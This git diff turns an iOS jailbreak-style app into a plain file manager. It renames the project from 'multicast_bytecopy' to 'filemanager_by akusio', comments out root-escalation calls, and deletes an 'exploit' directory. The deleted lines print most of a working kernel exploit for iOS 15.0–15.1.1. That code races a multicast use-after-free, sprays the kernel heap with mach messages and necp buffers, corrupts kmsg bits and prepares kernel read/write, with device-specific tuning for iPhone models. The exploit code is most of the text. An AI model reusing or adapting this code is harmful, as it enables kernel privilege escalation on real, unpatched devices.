diff --git a/multicast_bytecopy/AXFIle.m b/filemanager_by akusio/AXFIle.m
similarity index 100%
rename from multicast_bytecopy/AXFIle.m
rename to filemanager_by akusio/AXFIle.m
diff --git a/multicast_bytecopy/AXFile.h b/filemanager_by akusio/AXFile.h
similarity index 100%
rename from multicast_bytecopy/AXFile.h
rename to filemanager_by akusio/AXFile.h
diff --git a/multicast_bytecopy/AXFileViewController.h b/filemanager_by akusio/AXFileViewController.h
similarity index 100%
rename from multicast_bytecopy/AXFileViewController.h
rename to filemanager_by akusio/AXFileViewController.h
diff --git a/multicast_bytecopy/AXFileViewController.m b/filemanager_by akusio/AXFileViewController.m
similarity index 100%
rename from multicast_bytecopy/AXFileViewController.m
rename to filemanager_by akusio/AXFileViewController.m
diff --git a/multicast_bytecopy/AXLocationBackgrounder.h b/filemanager_by akusio/AXLocationBackgrounder.h
similarity index 100%
rename from multicast_bytecopy/AXLocationBackgrounder.h
rename to filemanager_by akusio/AXLocationBackgrounder.h
diff --git a/multicast_bytecopy/AXLocationBackgrounder.m b/filemanager_by akusio/AXLocationBackgrounder.m
similarity index 100%
rename from multicast_bytecopy/AXLocationBackgrounder.m
rename to filemanager_by akusio/AXLocationBackgrounder.m
diff --git a/multicast_bytecopy/AXNavigationController.h b/filemanager_by akusio/AXNavigationController.h
similarity index 100%
rename from multicast_bytecopy/AXNavigationController.h
rename to filemanager_by akusio/AXNavigationController.h
diff --git a/multicast_bytecopy/AXNavigationController.m b/filemanager_by akusio/AXNavigationController.m
similarity index 100%
rename from multicast_bytecopy/AXNavigationController.m
rename to filemanager_by akusio/AXNavigationController.m
diff --git a/multicast_bytecopy/AppDelegate.h b/filemanager_by akusio/AppDelegate.h
similarity index 100%
rename from multicast_bytecopy/AppDelegate.h
rename to filemanager_by akusio/AppDelegate.h
diff --git a/multicast_bytecopy/AppDelegate.m b/filemanager_by akusio/AppDelegate.m
similarity index 91%
rename from multicast_bytecopy/AppDelegate.m
rename to filemanager_by akusio/AppDelegate.m
index 63c0640..8106f37 100644
--- a/multicast_bytecopy/AppDelegate.m
+++ b/filemanager_by akusio/AppDelegate.m	
@@ -1,5 +1,4 @@
 #import "AppDelegate.h"
-#import "exploit/exploit.h"
 #import "ViewController.h"
 
 @interface AppDelegate ()
@@ -32,11 +31,6 @@
 }
 
 -(void)applicationWillTerminate:(UIApplication *)application{
-    
-    NSLog(@"[AXIO] will terminate...");
-    noRoot();
-    exploitation_cleanup();
-    
 }
 
 @end
diff --git a/multicast_bytecopy/Base.lproj/LaunchScreen.storyboard b/filemanager_by akusio/Base.lproj/LaunchScreen.storyboard
similarity index 100%
rename from multicast_bytecopy/Base.lproj/LaunchScreen.storyboard
rename to filemanager_by akusio/Base.lproj/LaunchScreen.storyboard
diff --git a/multicast_bytecopy/Base.lproj/Main.storyboard b/filemanager_by akusio/Base.lproj/Main.storyboard
similarity index 100%
rename from multicast_bytecopy/Base.lproj/Main.storyboard
rename to filemanager_by akusio/Base.lproj/Main.storyboard
diff --git a/multicast_bytecopy/FileManager.h b/filemanager_by akusio/FileManager.h
similarity index 100%
rename from multicast_bytecopy/FileManager.h
rename to filemanager_by akusio/FileManager.h
diff --git a/multicast_bytecopy/FileManager.m b/filemanager_by akusio/FileManager.m
similarity index 92%
rename from multicast_bytecopy/FileManager.m
rename to filemanager_by akusio/FileManager.m
index 7ac7a6a..6b5b166 100644
--- a/multicast_bytecopy/FileManager.m
+++ b/filemanager_by akusio/FileManager.m	
@@ -67,18 +67,18 @@
 
 
 +(BOOL)createFile:(NSString*)path{
-    getRootThisProc();
+    //getRootThisProc();
     BOOL ret = [[NSFileManager defaultManager] createFileAtPath:path contents:[NSData data] attributes:nil];
-    noRoot();
+    //noRoot();
     return ret;
 }
 
 
 
 +(BOOL)createDirectory:(NSString*)path{
-    getRootThisProc();
+    //getRootThisProc();
     BOOL ret = [[NSFileManager defaultManager] createDirectoryAtPath:path withIntermediateDirectories:YES attributes:nil error:nil];
-    noRoot();
+    //noRoot();
     return ret;
 }
 
@@ -86,9 +86,9 @@
 
 +(NSArray<NSString*>*)fileList:(NSString*)path{
     
-    getRootThisProc();
+    //getRootThisProc();
     NSArray<NSString*>* ret = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:path error:nil];
-    noRoot();
+    //noRoot();
     return ret;
     
 }
@@ -114,18 +114,18 @@
 
 +(BOOL)removeFile:(NSString*)path{
     
-    getRootThisProc();
+    //getRootThisProc();
     BOOL ret = [[NSFileManager defaultManager] removeItemAtPath:path error:nil];
-    noRoot();
+    //noRoot();
     return ret;
     
 }
 
 +(BOOL)copyFile:(NSString*)src toPath:(NSString*)dst{
     
-    getRootThisProc();
+    //getRootThisProc();
     BOOL ret = [[NSFileManager defaultManager] copyItemAtPath:src toPath:dst error:nil];
-    noRoot();
+    //noRoot();
     return ret;
 }
 
diff --git a/multicast_bytecopy/SceneDelegate.h b/filemanager_by akusio/SceneDelegate.h
similarity index 100%
rename from multicast_bytecopy/SceneDelegate.h
rename to filemanager_by akusio/SceneDelegate.h
diff --git a/multicast_bytecopy/SceneDelegate.m b/filemanager_by akusio/SceneDelegate.m
similarity index 99%
rename from multicast_bytecopy/SceneDelegate.m
rename to filemanager_by akusio/SceneDelegate.m
index fcac069..854b659 100644
--- a/multicast_bytecopy/SceneDelegate.m
+++ b/filemanager_by akusio/SceneDelegate.m	
@@ -45,7 +45,7 @@
     // Called as the scene transitions from the foreground to the background.
     // Use this method to save data, release shared resources, and store enough scene-specific state information
     // to restore the scene back to its current state.
-    noRoot();
+    //noRoot();
 }
 
 
diff --git a/multicast_bytecopy/ViewController.h b/filemanager_by akusio/ViewController.h
similarity index 62%
rename from multicast_bytecopy/ViewController.h
rename to filemanager_by akusio/ViewController.h
index 937c2fa..efa26eb 100644
--- a/multicast_bytecopy/ViewController.h
+++ b/filemanager_by akusio/ViewController.h	
@@ -1,10 +1,8 @@
 #import <UIKit/UIKit.h>
 
-void getRootThisProc(void);
-void noRoot(void);
-
 @interface ViewController : UIViewController
 
 
 @end
 
+
diff --git a/multicast_bytecopy/ViewController.m b/filemanager_by akusio/ViewController.m
similarity index 98%
rename from multicast_bytecopy/ViewController.m
rename to filemanager_by akusio/ViewController.m
index fc22c58..3e4b63b 100644
--- a/multicast_bytecopy/ViewController.m
+++ b/filemanager_by akusio/ViewController.m	
@@ -1,7 +1,4 @@
 #import "ViewController.h"
-
-#include "exploit/exploit.h"
-#include "exploit/kernel_rw.h"
 #include "kstruct.h"
 #include "patchfinder64.h"
 #include "kerneldec.h"
@@ -17,7 +14,7 @@
 #import "AXNavigationController.h"
 #import "AXFileViewController.h"
 #import "AXLocationBackgrounder.h"
-
+/*
 extern int csops(int, int, int*, int);
 
 const uint64_t kernel_base_addr = 0xFFFFFFF007004000;
@@ -360,7 +357,7 @@ static int go(void)
     
     return 0;
 }
-
+*/
 
 @interface ViewController ()
 
@@ -376,18 +373,18 @@ static int go(void)
 
 -(void)viewDidAppear:(BOOL)animated{
     
-    [AXLocationBackgrounder startBackgrounder];
-    
-    sleep(1);
+    //[AXLocationBackgrounder startBackgrounder];
     
+    //sleep(1);
+    /*
     pthread_t pt;
     pthread_create(&pt, NULL, (void *(*)(void *))go, NULL);
     pthread_join(pt, NULL);
     sleep(1);
-    
+    */
     AXFileViewController* fv = [[AXFileViewController alloc] initWithPath:@"/"];
     AXNavigationController* vc = [[AXNavigationController alloc] initWithRootViewController:fv];
-    vc.modalPresentationStyle = UIModalPresentationFullScreen;
+    vc.modalPresentationStyle = UIModalPresentationAutomatic;
     [self presentViewController:vc animated:YES completion:nil];
     
 }
diff --git a/multicast_bytecopy/kerneldec.cpp b/filemanager_by akusio/kerneldec.cpp
similarity index 100%
rename from multicast_bytecopy/kerneldec.cpp
rename to filemanager_by akusio/kerneldec.cpp
diff --git a/multicast_bytecopy/kerneldec.h b/filemanager_by akusio/kerneldec.h
similarity index 100%
rename from multicast_bytecopy/kerneldec.h
rename to filemanager_by akusio/kerneldec.h
diff --git a/multicast_bytecopy/kstruct.h b/filemanager_by akusio/kstruct.h
similarity index 100%
rename from multicast_bytecopy/kstruct.h
rename to filemanager_by akusio/kstruct.h
diff --git a/filemanager_by akusio/liblzfse.a b/filemanager_by akusio/liblzfse.a
new file mode 120000
index 0000000..ad31884
--- /dev/null
+++ b/filemanager_by akusio/liblzfse.a	
@@ -0,0 +1 @@
+../../lzfse/build/bin/liblzfse.a
\ No newline at end of file
diff --git a/multicast_bytecopy/lzfse.h b/filemanager_by akusio/lzfse.h
similarity index 100%
rename from multicast_bytecopy/lzfse.h
rename to filemanager_by akusio/lzfse.h
diff --git a/multicast_bytecopy/lzfse_encode_tables.h b/filemanager_by akusio/lzfse_encode_tables.h
similarity index 100%
rename from multicast_bytecopy/lzfse_encode_tables.h
rename to filemanager_by akusio/lzfse_encode_tables.h
diff --git a/multicast_bytecopy/lzfse_fse.h b/filemanager_by akusio/lzfse_fse.h
similarity index 100%
rename from multicast_bytecopy/lzfse_fse.h
rename to filemanager_by akusio/lzfse_fse.h
diff --git a/multicast_bytecopy/lzfse_internal.h b/filemanager_by akusio/lzfse_internal.h
similarity index 100%
rename from multicast_bytecopy/lzfse_internal.h
rename to filemanager_by akusio/lzfse_internal.h
diff --git a/multicast_bytecopy/lzfse_tunables.h b/filemanager_by akusio/lzfse_tunables.h
similarity index 100%
rename from multicast_bytecopy/lzfse_tunables.h
rename to filemanager_by akusio/lzfse_tunables.h
diff --git a/multicast_bytecopy/lzssdec.cpp b/filemanager_by akusio/lzssdec.cpp
similarity index 100%
rename from multicast_bytecopy/lzssdec.cpp
rename to filemanager_by akusio/lzssdec.cpp
diff --git a/multicast_bytecopy/lzssdec.h b/filemanager_by akusio/lzssdec.h
similarity index 100%
rename from multicast_bytecopy/lzssdec.h
rename to filemanager_by akusio/lzssdec.h
diff --git a/multicast_bytecopy/patchfinder64.h b/filemanager_by akusio/patchfinder64.h
similarity index 100%
rename from multicast_bytecopy/patchfinder64.h
rename to filemanager_by akusio/patchfinder64.h
diff --git a/multicast_bytecopy/patchfinder64.m b/filemanager_by akusio/patchfinder64.m
similarity index 100%
rename from multicast_bytecopy/patchfinder64.m
rename to filemanager_by akusio/patchfinder64.m
diff --git a/multicast_bytecopy/Assets.xcassets/AccentColor.colorset/Contents.json b/multicast_bytecopy/Assets.xcassets/AccentColor.colorset/Contents.json
deleted file mode 100644
index eb87897..0000000
--- a/multicast_bytecopy/Assets.xcassets/AccentColor.colorset/Contents.json
+++ /dev/null
@@ -1,11 +0,0 @@
-{
-  "colors" : [
-    {
-      "idiom" : "universal"
-    }
-  ],
-  "info" : {
-    "author" : "xcode",
-    "version" : 1
-  }
-}
diff --git a/multicast_bytecopy/Assets.xcassets/AppIcon.appiconset/Contents.json b/multicast_bytecopy/Assets.xcassets/AppIcon.appiconset/Contents.json
deleted file mode 100644
index 9221b9b..0000000
--- a/multicast_bytecopy/Assets.xcassets/AppIcon.appiconset/Contents.json
+++ /dev/null
@@ -1,98 +0,0 @@
-{
-  "images" : [
-    {
-      "idiom" : "iphone",
-      "scale" : "2x",
-      "size" : "20x20"
-    },
-    {
-      "idiom" : "iphone",
-      "scale" : "3x",
-      "size" : "20x20"
-    },
-    {
-      "idiom" : "iphone",
-      "scale" : "2x",
-      "size" : "29x29"
-    },
-    {
-      "idiom" : "iphone",
-      "scale" : "3x",
-      "size" : "29x29"
-    },
-    {
-      "idiom" : "iphone",
-      "scale" : "2x",
-      "size" : "40x40"
-    },
-    {
-      "idiom" : "iphone",
-      "scale" : "3x",
-      "size" : "40x40"
-    },
-    {
-      "idiom" : "iphone",
-      "scale" : "2x",
-      "size" : "60x60"
-    },
-    {
-      "idiom" : "iphone",
-      "scale" : "3x",
-      "size" : "60x60"
-    },
-    {
-      "idiom" : "ipad",
-      "scale" : "1x",
-      "size" : "20x20"
-    },
-    {
-      "idiom" : "ipad",
-      "scale" : "2x",
-      "size" : "20x20"
-    },
-    {
-      "idiom" : "ipad",
-      "scale" : "1x",
-      "size" : "29x29"
-    },
-    {
-      "idiom" : "ipad",
-      "scale" : "2x",
-      "size" : "29x29"
-    },
-    {
-      "idiom" : "ipad",
-      "scale" : "1x",
-      "size" : "40x40"
-    },
-    {
-      "idiom" : "ipad",
-      "scale" : "2x",
-      "size" : "40x40"
-    },
-    {
-      "idiom" : "ipad",
-      "scale" : "1x",
-      "size" : "76x76"
-    },
-    {
-      "idiom" : "ipad",
-      "scale" : "2x",
-      "size" : "76x76"
-    },
-    {
-      "idiom" : "ipad",
-      "scale" : "2x",
-      "size" : "83.5x83.5"
-    },
-    {
-      "idiom" : "ios-marketing",
-      "scale" : "1x",
-      "size" : "1024x1024"
-    }
-  ],
-  "info" : {
-    "author" : "xcode",
-    "version" : 1
-  }
-}
diff --git a/multicast_bytecopy/Assets.xcassets/Contents.json b/multicast_bytecopy/Assets.xcassets/Contents.json
deleted file mode 100644
index 73c0059..0000000
--- a/multicast_bytecopy/Assets.xcassets/Contents.json
+++ /dev/null
@@ -1,6 +0,0 @@
-{
-  "info" : {
-    "author" : "xcode",
-    "version" : 1
-  }
-}
diff --git a/multicast_bytecopy/Info.plist b/multicast_bytecopy/Info.plist
deleted file mode 100644
index d4a987a..0000000
--- a/multicast_bytecopy/Info.plist
+++ /dev/null
@@ -1,29 +0,0 @@
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
-<plist version="1.0">
-<dict>
-	<key>UIApplicationSceneManifest</key>
-	<dict>
-		<key>UIApplicationSupportsMultipleScenes</key>
-		<false/>
-		<key>UISceneConfigurations</key>
-		<dict>
-			<key>UIWindowSceneSessionRoleApplication</key>
-			<array>
-				<dict>
-					<key>UISceneConfigurationName</key>
-					<string>Default Configuration</string>
-					<key>UISceneDelegateClassName</key>
-					<string>SceneDelegate</string>
-					<key>UISceneStoryboardFile</key>
-					<string>Main</string>
-				</dict>
-			</array>
-		</dict>
-	</dict>
-	<key>UIBackgroundModes</key>
-	<array>
-		<string>location</string>
-	</array>
-</dict>
-</plist>
diff --git a/multicast_bytecopy/exploit/IOGPU.c b/multicast_bytecopy/exploit/IOGPU.c
deleted file mode 100644
index a9057d2..0000000
--- a/multicast_bytecopy/exploit/IOGPU.c
+++ /dev/null
@@ -1,82 +0,0 @@
-#include "IOGPU.h"
-
-#include <sys/utsname.h>
-
-io_connect_t IOGPU_init(void)
-{
-    mach_port_t mp = MACH_PORT_NULL;
-    kern_return_t IOMasterPort(mach_port_t, mach_port_t *);
-    IOMasterPort(MACH_PORT_NULL, &mp);
-    io_connect_t uc;
-
-    io_service_t s = IOServiceGetMatchingService(mp, IOServiceMatching("AGXAccelerator"));
-    if (s == MACH_PORT_NULL)
-    {
-        return 0;
-    }
-    
-    if (IOServiceOpen(s, mach_task_self(), 1, &uc) != KERN_SUCCESS)
-    {
-        return 0;
-    }
-    
-    return uc;
-}
-
-void IOGPU_exit(io_connect_t uc)
-{
-    IOServiceClose(uc);
-}
-
-uint32_t IOGPU_create_command_queue(io_connect_t uc, uint64_t member)
-{
-    uint64_t outStructCnt = 0x10;
-    uint32_t inStructCnt = 0x408;
-    uint8_t inStruct[0x408] = {0};
-    uint8_t outStruct[0x10] = {0};
-    
-    // avoid null termination
-    memset(inStruct, 0x01, 0x30);
-    *(uint64_t *)(inStruct + 0x30) = member;
-
-    kern_return_t kr = IOConnectCallStructMethod(uc, 7, inStruct, inStructCnt, outStruct, (size_t *)&outStructCnt);
-
-    if (kr)
-        return 0;
-    
-    return 1;
-}
-
-int IOGPU_get_command_queue_extra_refills_needed(void)
-{
-    struct utsname u;
-    uname(&u);
-    
-    // iPhone 7
-    // iPhone 11
-    // iPhone 12
-    // iPhone 13
-    if (
-       strstr(u.machine, "iPhone9,")
-    || strstr(u.machine, "iPhone12,")
-    || strstr(u.machine, "iPhone13,")
-    || strstr(u.machine, "iPhone14,")
-    || strstr(u.machine, "iPad13,")
-    )
-    {
-        return 1;
-    }
-    // iPhone 8, X
-    // iPhone XS, XR
-    else if (
-       strstr(u.machine, "iPhone10,")
-    || strstr(u.machine, "iPhone11,")
-    )
-    {
-        return 3;
-    }
-    
-    printf("IOGPU_get_command_queue_extra_refills_needed(): Unknown device %s! May panic in generic part until correct number 1-5 is provided for this device!\n", u.machine);
-    
-    return -1;
-}
diff --git a/multicast_bytecopy/exploit/IOGPU.h b/multicast_bytecopy/exploit/IOGPU.h
deleted file mode 100644
index 8ece6aa..0000000
--- a/multicast_bytecopy/exploit/IOGPU.h
+++ /dev/null
@@ -1,16 +0,0 @@
-#ifndef __IOGPU_H__
-#define __IOGPU_H__
-
-#include "iokit.h"
-
-#include <mach/mach.h>
-#include <stdint.h>
-
-io_connect_t IOGPU_init(void);
-void IOGPU_exit(io_connect_t uc);
-
-uint32_t IOGPU_create_command_queue(io_connect_t uc, uint64_t member);
-
-int IOGPU_get_command_queue_extra_refills_needed(void);
-
-#endif
diff --git a/multicast_bytecopy/exploit/IOSurfaceRoot.c b/multicast_bytecopy/exploit/IOSurfaceRoot.c
deleted file mode 100644
index 5756ff4..0000000
--- a/multicast_bytecopy/exploit/IOSurfaceRoot.c
+++ /dev/null
@@ -1,124 +0,0 @@
-#include "IOSurfaceRoot.h"
-
-io_connect_t IOSurfaceRoot_init(void)
-{
-    kern_return_t IOMasterPort(mach_port_t, mach_port_t *);
-    mach_port_t mp = MACH_PORT_NULL;
-    IOMasterPort(MACH_PORT_NULL, &mp);
-    io_connect_t uc;
-
-    io_service_t s = IOServiceGetMatchingService(mp, IOServiceMatching("IOSurfaceRoot"));
-    if (s == MACH_PORT_NULL)
-    {
-        return 0;
-    }
-    
-    if (IOServiceOpen(s, mach_task_self(), 0, &uc) != KERN_SUCCESS)
-    {
-        return 0;
-    }
-    
-    return uc;
-}
-
-void IOSurfaceRoot_exit(io_connect_t uc)
-{
-    IOServiceClose(uc);
-}
-
-uint32_t IOSurfaceRoot_create_surface_fast(io_connect_t uc)
-{
-    // Brandon Azad's definitions from https://bugs.chromium.org/p/project-zero/issues/detail?id=1986#c4
-    struct _IOSurfaceFastCreateArgs {
-        uint64_t address;
-        uint32_t width;
-        uint32_t height;
-        uint32_t pixel_format;
-        uint32_t bytes_per_element;
-        uint32_t bytes_per_row;
-        uint32_t alloc_size;
-    };
-
-    struct IOSurfaceLockResult {
-        uint8_t _pad1[0x18];
-        uint32_t surface_id;
-        uint8_t _pad2[0xF60-0x18-0x4];
-    };
-    
-    struct _IOSurfaceFastCreateArgs create_args = { .alloc_size = (uint32_t) 0x4000 };
-    struct IOSurfaceLockResult lock_result = {0};
-    uint64_t lock_result_size = sizeof(lock_result);
-    
-    IOConnectCallMethod(
-            uc,
-            6,
-            NULL, 0,
-            &create_args, sizeof(create_args),
-            NULL, NULL,
-            &lock_result, (size_t *)&lock_result_size);
-    
-    return lock_result.surface_id;
-}
-
-kern_return_t IOSurfaceRoot_lookup_surface(io_connect_t uc, uint32_t surf_id)
-{
-    uint64_t sz = 0xF60;
-    uint8_t o[0xF60];
-    uint64_t scalarInput = surf_id;
-    kern_return_t ret = IOConnectCallMethod(uc, 4, &scalarInput, 1, 0, 0, 0, 0, o, (size_t *)&sz);
-    return ret;
-}
-
-kern_return_t IOSurfaceRoot_release_surface(io_connect_t uc, uint32_t surf_id)
-{
-    uint64_t scalarInput = surf_id;
-    kern_return_t ret = IOConnectCallMethod(uc, 1, &scalarInput, 1, 0, 0, 0, 0, 0, 0);
-    return ret;
-}
-
-void IOSurfaceRoot_release_all(io_connect_t uc)
-{
-    for (uint32_t surf_id = 1; surf_id < 0x3FFF; ++surf_id)
-    {
-        IOSurfaceRoot_release_surface(uc, surf_id);
-    }
-}
-
-uint32_t IOSurfaceRoot_get_surface_use_count(io_connect_t uc, uint32_t surf_id)
-{
-    uint64_t scalarInput = surf_id;
-    uint64_t output = 0;
-    uint64_t outputCnt = 1;
-    IOConnectCallMethod(uc, 16, &scalarInput, 1, 0, 0, &output, (uint32_t *)&outputCnt, 0, 0);
-
-    return (uint32_t)output;
-}
-
-void IOSurfaceRoot_set_compressed_tile_data_region_memory_used_of_plane(io_connect_t uc, uint32_t surf_id, uint64_t tile)
-{
-    uint64_t scalarInput[3];
-
-    scalarInput[0] = surf_id;
-    scalarInput[1] = 0;
-    scalarInput[2] = tile;
-
-    IOConnectCallScalarMethod(uc, 31, (uint64_t *)&scalarInput, 3, 0, 0);
-}
-
-uint32_t IOSurfaceRoot_cause_array_size_to_be_0x4000(void)
-{
-    for (int i = 0; i < 4; ++i)
-    {
-        io_connect_t uc = IOSurfaceRoot_init();
-        for (int i = 0; i < 0xf00; ++i)
-        {
-            uint32_t last_id = IOSurfaceRoot_create_surface_fast(uc);
-            if (0x3400 <= (last_id * sizeof(uint64_t)))
-            {
-                return last_id;
-            }
-        }
-    }
-    
-    return -1;
-}
diff --git a/multicast_bytecopy/exploit/IOSurfaceRoot.h b/multicast_bytecopy/exploit/IOSurfaceRoot.h
deleted file mode 100644
index 529b2c9..0000000
--- a/multicast_bytecopy/exploit/IOSurfaceRoot.h
+++ /dev/null
@@ -1,25 +0,0 @@
-#ifndef __IOSURFACEROOT_H__
-#define __IOSURFACEROOT_H__
-
-#include "iokit.h"
-
-#include <IOSurface/IOSurfaceRef.h>
-#include <stdint.h>
-
-io_connect_t IOSurfaceRoot_init(void);
-void IOSurfaceRoot_exit(io_connect_t uc);
-
-uint32_t IOSurfaceRoot_create_surface_fast(io_connect_t uc);
-
-kern_return_t IOSurfaceRoot_lookup_surface(io_connect_t uc, uint32_t surf_id);
-
-int IOSurfaceRoot_release_surface(io_connect_t uc, uint32_t surf_id);
-void IOSurfaceRoot_release_all(io_connect_t uc);
-
-uint32_t IOSurfaceRoot_get_surface_use_count(io_connect_t uc, uint32_t surf_id);
-
-void IOSurfaceRoot_set_compressed_tile_data_region_memory_used_of_plane(io_connect_t uc, uint32_t surf_id, uint64_t tile);
-
-uint32_t IOSurfaceRoot_cause_array_size_to_be_0x4000(void);
-
-#endif
diff --git a/multicast_bytecopy/exploit/exploit.c b/multicast_bytecopy/exploit/exploit.c
deleted file mode 100644
index d5c669e..0000000
--- a/multicast_bytecopy/exploit/exploit.c
+++ /dev/null
@@ -1,335 +0,0 @@
-#include "exploit.h"
-
-#include "iokit.h"
-#include "IOGPU.h"
-#include "IOSurfaceRoot.h"
-#include "kernel_rw.h"
-#include "kernel_base.h"
-#include "mcast.h"
-#include "necp.h"
-#include "port_utils.h"
-#include "spray.h"
-
-#include <mach/mach.h>
-#include <pthread.h>
-#include <sys/utsname.h>
-#include <sys/socket.h>
-#include <sys/syscall.h>
-#include <unistd.h>
-
-#pragma clang diagnostic ignored "-Wdeprecated-declarations"
-
-#define KHEAP_DATA_MAPPABLE_LOC 0xFFFFFFE383200000 // may have to be tweaked per device
-#define KHEAP_DEFAULT_MAPPABLE_LOC 0xFFFFFFE376000000 // may have to be tweaked per device
-#define BYTECOPY_FIRST_TARGET (KHEAP_DATA_MAPPABLE_LOC + 0x3F8C - BYTECOPY_OFFSET_IPV6) // will copy over trailer size of kmsg (used for identification of which kmsg was corrupted)
-#define BYTECOPY_SECOND_TARGET (KHEAP_DATA_MAPPABLE_LOC + 3 - BYTECOPY_OFFSET_IPV6) // will copy over highest byte of kmsg's message bits, turning a non-complex kmsg to a complex one if its size ends in 0x80 (MACH_MSGH_BITS_COMPLEX)
-#define BYTECOPY_OFFSET_IPV6 0x28
-#define PORTS_COUNT 0x2A00
-#define KMSG_SIZE 0x3F80 // the low 0x80 byte of this size will be copied to corrupt the message bits (setting 0x80000000, MACH_MSGH_BITS_COMPLEX)
-#define UAF_BUFFER_KALLOC_1664_JOIN_COUNT 64 // UaF buffer ends up in default.kalloc.1664
-
-mach_port_t notif_port = MACH_PORT_NULL;
-mach_port_t *kheap_default_ports = NULL;
-uint8_t *IOSurfaceClient_array_buf = NULL;
-mach_port_t *kheap_data_ports = NULL;
-int kheap_data_idx = -1;
-int extra_frees_for_device = -1;
-io_connect_t iogpu_connect = MACH_PORT_NULL;
-
-mach_port_t get_arb_free_holder(void)
-{
-    int success = 0;
-    
-    // reliability voodoo
-    for (int i = 0; i < 3; ++i)
-    {
-        mcast_increase_race_reliability();
-        printf("Increase reliability...\n");
-    }
-    
-    // more reliability voodoo
-    pthread_attr_t pattr;
-    pthread_attr_init(&pattr);
-    pthread_attr_set_qos_class_np(&pattr, QOS_CLASS_USER_INITIATED, 0);
-        
-    // initialize refill buffer, putting the target for the bytecopy primitive there
-    uint8_t *necp_buf = malloc(4096);
-    *(uint64_t *)(necp_buf + 0x278) = BYTECOPY_FIRST_TARGET;
-    
-    printf("Start (will fail if device has not been rebooted since last run)\n");
-    kheap_data_idx = -1;
-    for (int iterations = 0; iterations < 255; ++iterations)
-    {
-        pthread_t pt1;
-        pthread_t pt2;
-        int s = socket(AF_INET6, SOCK_DGRAM, 0);
-        int necp_fd = necp_open(0);
-        
-        mcast_race_sock = s;
-        
-        // grow the buffer on which the UaF will be triggered to default.kalloc.1664 and
-        // put it at its max size before next realloc will occur
-        int ip = 0;
-        for (ip = 0; ip < UAF_BUFFER_KALLOC_1664_JOIN_COUNT-2; ++ip)
-        {
-            mcast_join_group(ip);
-        }
-        
-        // trigger the UaF in default.kalloc.1664, perform bytecopy primitive if refill is successful
-        pthread_create(&pt1, &pattr, (void *(*)(void *))mcast_join_group, (void *)(uint64_t)ip);
-        pthread_create(&pt2, &pattr, (void *(*)(void *))mcast_join_group, (void *)(uint64_t)(ip + 1));
-        
-        // refill the UaF buffer in default.kalloc.1664 during the race
-        for (int i = 0; i < 10; ++i)
-        {
-            spray_default_kalloc_necp(necp_fd, necp_buf, 0x318);
-        }
-        
-        // synchronize
-        pthread_join(pt1, NULL);
-        pthread_join(pt2, NULL);
-        
-        // find out if the refill succeeded, in which case a corrupted trailer size will be returned
-        // for the holder of the corrupted kmsg, which has also had its message bits corrupted
-        // (0x80000000 - MACH_MSGH_BITS_COMPLEX - now set)
-        {
-            for (int i = 0; i < PORTS_COUNT; ++i)
-            {
-                int sz = port_peek_trailer_size(kheap_data_ports[i]);
-                if (sz != 8)
-                {
-                    printf("kheap_data_idx: %08X\n", i);
-                    kheap_data_idx = i;
-                    break;
-                }
-            }
-            if (kheap_data_idx != -1)
-            {
-                success = 1;
-                break;
-            }
-        }
-
-        close(s);
-        printf("iteration %d\n", iterations);
-    }
-    
-    if (!success)
-    {
-        printf("Failed! Run exploit only once per boot\n");
-        printf("Make sure you are on iOS 15.0 - 15.1.1 and reboot to try again\n");
-        exit(1);
-    }
-    
-    free(necp_buf);
-    
-    return kheap_data_ports[kheap_data_idx];
-}
-
-int exploitation_init(void)
-{
-    // different by device, retrieve it first and fail if unsuccessful
-    extra_frees_for_device = IOGPU_get_command_queue_extra_refills_needed();
-    if (extra_frees_for_device == -1)
-    {
-        printf("Exiting early, provide correct number 1-5 in the code for this device to proceed\n");
-        return 1;
-    }
-    
-    kheap_data_ports = malloc(PORTS_COUNT * sizeof(mach_port_t));
-    kheap_default_ports = malloc(PORTS_COUNT * sizeof(mach_port_t));
-    mach_port_t *contained_ports = malloc(PORTS_COUNT * sizeof(mach_port_t));
-    mach_port_t *ool_ports = malloc(0x4000);
-    uint8_t *kheap_data_spray_buf = malloc(0x4000);
-    memset(kheap_data_ports, 0, PORTS_COUNT * sizeof(mach_port_t));
-    memset(kheap_default_ports, 0, PORTS_COUNT * sizeof(mach_port_t));
-    memset(contained_ports, 0, PORTS_COUNT * sizeof(mach_port_t));
-    memset(ool_ports, 0, 0x4000);
-    memset(kheap_data_spray_buf, 0, 0x4000);
-     
-    // initialize the inline data
-    
-    // fake descriptor for free primitive
-    *(uint32_t *)(kheap_data_spray_buf + sizeof(mach_msg_header_t)) = 1;
-    *(uint64_t *)(kheap_data_spray_buf + sizeof(mach_msg_header_t) + sizeof(uint32_t)) = KHEAP_DEFAULT_MAPPABLE_LOC; // free primitive target
-    *(uint64_t *)(kheap_data_spray_buf + sizeof(mach_msg_header_t) + sizeof(uint32_t) + sizeof(uint64_t)) = 0x000007F802110000; // disposition, size, etc
-    // align a pointer here so that when the kmsg trailer size is corrupted, this pointer
-    // will after that be followed and a second bytecopy performed where it points (kmsg message bits)
-    *(uint64_t *)(kheap_data_spray_buf + 0x3F64) = BYTECOPY_SECOND_TARGET;
-    
-    // spray large sprays to map  KHEAP_DATA_MAPPABLE_LOC and KHEAP_DEFAULT_MAPPABLE_LOC
-    for (int i = 0; i < PORTS_COUNT; ++i)
-    {
-        // KHEAP_DEFAULT
-        *ool_ports = port_new();
-        contained_ports[i] = *ool_ports;
-        mach_port_t *pp = spray_default_kalloc_ool_ports(0x4000, 1, ool_ports);
-        kheap_default_ports[i] = pp[0];
-        free(pp);
-        
-        // KHEAP_DATA_BUFFERS
-        kheap_data_ports[i] = spray_data_kalloc_kmsg_single(kheap_data_spray_buf, KMSG_SIZE);
-    }
-    
-    notif_port = port_new();
-    for (int i = 0; i < PORTS_COUNT; ++i)
-    {
-        mach_port_t prev;
-        mach_port_request_notification(mach_task_self(), contained_ports[i], MACH_NOTIFY_NO_SENDERS, 0, notif_port, MACH_MSG_TYPE_MAKE_SEND_ONCE, &prev);
-        mach_port_deallocate(mach_task_self(), contained_ports[i]);
-    }
-    
-    // pre-init kernel rw
-    IOSurfaceClient_array_buf = malloc(0x4000);
-    kernel_rw_preinit(KHEAP_DATA_MAPPABLE_LOC - 0x4000 + 0x10, IOSurfaceClient_array_buf, 0x4000);
-    
-    free(contained_ports);
-    free(ool_ports);
-    free(kheap_data_spray_buf);
-    
-    return 0;
-}
-
